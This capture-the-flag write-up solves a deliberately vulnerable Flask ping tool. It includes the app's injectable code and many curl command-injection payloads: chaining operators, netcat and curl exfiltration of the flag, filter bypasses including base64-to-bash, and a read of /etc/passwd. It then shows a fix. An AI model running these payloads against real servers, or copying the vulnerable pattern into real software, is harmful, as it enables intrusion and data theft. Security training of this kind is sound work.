---
title: "Web - Command Injection"
description: "Exploiting an OS command injection vulnerability in a web application's ping utility to achieve remote code execution and capture the flag."
author: "Zemi"
---

## Challenge Info

| Detail     | Value              |
|------------|--------------------|
| Category   | Web Exploitation   |
| Difficulty | Easy               |
| Points     | 150                |
| Flag       | `zemi{c0mm4nd_1nj3ct10n_p0p}` |

## Challenge Files

Download the challenge files to get started:

- [app.py](/Website/challenges/web-command-injection/app.py)
- [flag.txt](/Website/challenges/web-command-injection/flag.txt)
- [README.md](/Website/challenges/web-command-injection/README.md)
- [requirements.txt](/Website/challenges/web-command-injection/requirements.txt)

## Overview

Command injection happens when a web application passes user-supplied input directly into an operating system command. If the input is not sanitized, an attacker can chain additional commands and execute arbitrary code on the server. This is one of the most critical web vulnerabilities because it gives you a direct shell on the target.

## Setting Up the Challenge Locally

Save the following as `app.py` and run it with `python3 app.py`, or use Docker:

```python
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

PAGE = """
<!DOCTYPE html>
<html>
<head><title>Network Ping Tool</title></head>
<body>
  <h1>Network Ping Utility</h1>
  <form method="POST" action="/ping">
    <label>Enter IP address to ping:</label><br>
    <input type="text" name="ip" placeholder="127.0.0.1">
    <button type="submit">Ping</button>
  </form>
  {% if output %}
  <h2>Results:</h2>
  <pre>{{ output }}</pre>
  {% endif %}
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(PAGE)

@app.route("/ping", methods=["POST"])
def ping():
    ip = request.form.get("ip", "")
    # VULNERABLE: user input passed directly into os.popen()
    cmd = f"ping -c 2 {ip}"
    output = os.popen(cmd).read()
    return render_template_string(PAGE, output=output)

if __name__ == "__main__":
    # Create a flag file for the challenge
    with open("flag.txt", "w") as f:
        f.write("zemi{c0mm4nd_1nj3ct10n_p0p}")
    app.run(host="0.0.0.0", port=5000)
```

The app runs at `http://localhost:5000`.

## Reconnaissance

Visiting the app, we see a simple "Network Ping Utility" form. You enter an IP address and it runs `ping` on the server and returns the output. Whenever you see a web app executing system commands with user input, your command injection senses should be tingling.

Let's test a normal request first:

```bash
curl -s -X POST http://localhost:5000/ping -d "ip=127.0.0.1"
```

We get normal ping output. The app is clearly running `ping -c 2 127.0.0.1` on the backend.

## Understanding the Vulnerability

The backend constructs a shell command by directly interpolating user input:

```python
cmd = f"ping -c 2 {ip}"
```

If we supply `127.0.0.1`, the command becomes:

```
ping -c 2 127.0.0.1
```

But what if we supply `127.0.0.1; id`? The command becomes:

```
ping -c 2 127.0.0.1; id
```

The semicolon acts as a command separator in bash. The shell will execute `ping`, then execute `id`. That is command injection.

## Exploitation

### Step 1: Basic injection with semicolon

```bash
curl -s -X POST http://localhost:5000/ping -d "ip=127.0.0.1; id"
```

Output includes:

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
...
uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
```

We have command execution. The `id` output confirms our injected command ran.

### Step 2: Enumerate the filesystem

```bash
curl -s -X POST http://localhost:5000/ping -d "ip=127.0.0.1; ls -la"
```

Output:

```
...
-rw-r--r-- 1 appuser appuser   28 Feb  7 12:00 flag.txt
-rw-r--r-- 1 appuser appuser  812 Feb  7 12:00 app.py
```

We can see `flag.txt` in the current directory.

### Step 3: Read the flag

```bash
curl -s -X POST http://localhost:5000/ping -d "ip=127.0.0.1; cat flag.txt"
```

Output:

```
...
zemi{c0mm4nd_1nj3ct10n_p0p}
```

### Alternative Injection Operators

There are several shell metacharacters that can chain commands. If one is blocked, try another:

| Operator | Example | Behavior |
|----------|---------|----------|
| `;`  | `; cat flag.txt` | Runs the second command regardless of the first |
| `\|` | `\| cat flag.txt` | Pipes stdout of ping into cat (cat ignores stdin, still works) |
| `\|\|` | `\|\| cat flag.txt` | Runs the second command only if the first fails |
| `&&` | `&& cat flag.txt` | Runs the second command only if the first succeeds |
| `` ` `` | `` `cat flag.txt` `` | Command substitution — executes inside backticks first |
| `$()` | `$(cat flag.txt)` | Command substitution — same as backticks |
| `\n` | `%0a cat flag.txt` | Newline — starts a new command on a new line |

Using the pipe operator:

```bash
curl -s -X POST http://localhost:5000/ping -d "ip=| cat flag.txt"
```

Using newline injection (URL-encoded `\n`):

```bash
curl -s -X POST http://localhost:5000/ping -d "ip=127.0.0.1%0acat flag.txt"
```

Both return the flag.

## Blind Command Injection

Sometimes the application does not return command output to you. In those cases, you need blind injection techniques.

### Time-based detection

Inject a `sleep` command and observe if the response is delayed:

```bash
# This should take ~5 seconds longer than normal
curl -s -o /dev/null -w "Time: %{time_total}s\n" \
  -X POST http://localhost:5000/ping -d "ip=127.0.0.1; sleep 5"
```

If the response takes 5+ seconds, your command executed.

### Out-of-band data exfiltration

Start a listener on your machine and exfiltrate data to it:

```bash
# Terminal 1: Start a listener
nc -lvnp 9999

# Terminal 2: Inject a command that sends data to your listener
curl -s -X POST http://localhost:5000/ping \
  -d "ip=127.0.0.1; cat flag.txt | nc 127.0.0.1 9999"
```

Alternatively, use `curl` or `wget` to send data via HTTP:

```bash
curl -s -X POST http://localhost:5000/ping \
  -d "ip=127.0.0.1; curl http://127.0.0.1:9999/\$(cat flag.txt)"
```

## Bypassing Common Filters

Some applications try to filter dangerous characters. Here are common bypasses:

### Spaces filtered

Use `${IFS}` (Internal Field Separator, defaults to space), tabs (`%09`), or brace expansion:

```bash
# Using ${IFS}
curl -s -X POST http://localhost:5000/ping -d "ip=127.0.0.1;cat\${IFS}flag.txt"

# Using tab (URL-encoded)
curl -s -X POST http://localhost:5000/ping -d "ip=127.0.0.1;cat%09flag.txt"

# Using brace expansion
curl -s -X POST http://localhost:5000/ping -d "ip=127.0.0.1;{cat,flag.txt}"
```

### Keywords filtered (e.g., `cat` is blocked)

Use alternative commands or string concatenation:

```bash
# Alternative commands
curl -s -X POST http://localhost:5000/ping -d "ip=; tac flag.txt"
curl -s -X POST http://localhost:5000/ping -d "ip=; head flag.txt"
curl -s -X POST http://localhost:5000/ping -d "ip=; less flag.txt"
curl -s -X POST http://localhost:5000/ping -d "ip=; rev flag.txt | rev"

# String concatenation in bash
curl -s -X POST http://localhost:5000/ping -d "ip=; c'a't flag.txt"
curl -s -X POST http://localhost:5000/ping -d "ip=; c\at flag.txt"

# Using base64 to encode the command
curl -s -X POST http://localhost:5000/ping \
  -d "ip=; echo Y2F0IGZsYWcudHh0 | base64 -d | bash"
```

### Slash (`/`) filtered

```bash
# Using environment variable substitution
curl -s -X POST http://localhost:5000/ping \
  -d "ip=; cat \${HOME%%[a-z]*}etc\${HOME%%[a-z]*}passwd"
```

## The Vulnerable Code (Explained)

```python
@app.route("/ping", methods=["POST"])
def ping():
    ip = request.form.get("ip", "")
    # VULNERABLE: Direct string interpolation into a shell command.
    # os.popen() passes this to /bin/sh -c, which interprets shell metacharacters.
    cmd = f"ping -c 2 {ip}"
    output = os.popen(cmd).read()
    return render_template_string(PAGE, output=output)
```

Other dangerous functions in Python that can lead to command injection:

```python
os.system(cmd)              # Executes via shell
os.popen(cmd)               # Executes via shell, returns output
subprocess.call(cmd, shell=True)
subprocess.Popen(cmd, shell=True)
subprocess.run(cmd, shell=True)
```

## The Fix

The safest approach is to **never** pass user input to a shell. Use `subprocess` with `shell=False` (the default) and pass arguments as a list:

```python
import subprocess
import re

@app.route("/ping", methods=["POST"])
def ping():
    ip = request.form.get("ip", "")

    # Step 1: Validate input — only allow IP addresses
    if not re.match(r"^(\d{1,3}\.){3}\d{1,3}$", ip):
        return render_template_string(PAGE, output="Invalid IP address format.")

    # Step 2: Use subprocess with shell=False and an argument list
    try:
        result = subprocess.run(
            ["ping", "-c", "2", ip],  # Arguments as a list, NOT a string
            capture_output=True,
            text=True,
            timeout=10
        )
        output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        output = "Ping timed out."

    return render_template_string(PAGE, output=output)
```

Key changes:
1. **Input validation** with a strict regex that only allows IPv4 addresses
2. **`subprocess.run()` with `shell=False`** — the arguments are passed directly to the `ping` executable, not through a shell, so metacharacters like `;` and `|` are treated as literal characters
3. **Timeout** to prevent denial of service

## Tools Used

- **curl** — sending crafted HTTP requests from the command line
- **Netcat (`nc`)** — listener for blind command injection data exfiltration
- **Burp Suite** — (optional) intercepting and modifying requests in a browser
- **Commix** — automated command injection detection and exploitation tool

## Lessons Learned

- **Never** pass user input to shell commands via string concatenation or f-strings
- Use `subprocess.run()` with `shell=False` and a list of arguments instead of `os.popen()` or `os.system()`
- Always validate user input against an allowlist of expected formats (e.g., regex for IP addresses)
- Even if you filter certain characters, attackers have many bypass techniques — input validation alone is not sufficient without also using safe APIs
- If your application needs to run system commands, consider whether there is a library that does the same thing without invoking a shell (e.g., Python's `ipaddress` module for network utilities)
- Blind command injection is just as dangerous as visible injection — the absence of output does not mean the command did not execute
